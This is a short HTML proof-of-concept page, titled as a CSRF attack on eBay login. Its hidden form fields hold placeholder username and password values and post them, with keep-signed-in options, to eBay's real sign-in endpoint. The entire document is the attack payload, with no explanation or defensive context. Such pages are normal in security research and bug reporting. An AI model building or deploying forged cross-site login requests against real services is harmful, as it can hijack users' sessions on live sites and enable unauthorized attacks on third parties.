<html>
  <body>
    <h2>CSRF PoC for eBay Login</h2>
    <form method="POST" action="https://signin.ebay.com/signin/s">
      <input type="hidden" name="userid" id="userid" value="victims_username" data-testid="userid" maxlength="64" autocomplete="username" />
      <input type="hidden" name="pass" id="pass" value="victim_password" data-testid="pass" maxlength="64" autocomplete="current-password" aria-label="Password" />
      <input type="hidden" name="signin-continue" value="true" />
      <input type="hidden" name="keepSignedInOption" value="true" />
      <input type="hidden" name="src" value="https://signin.ebay.com/" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
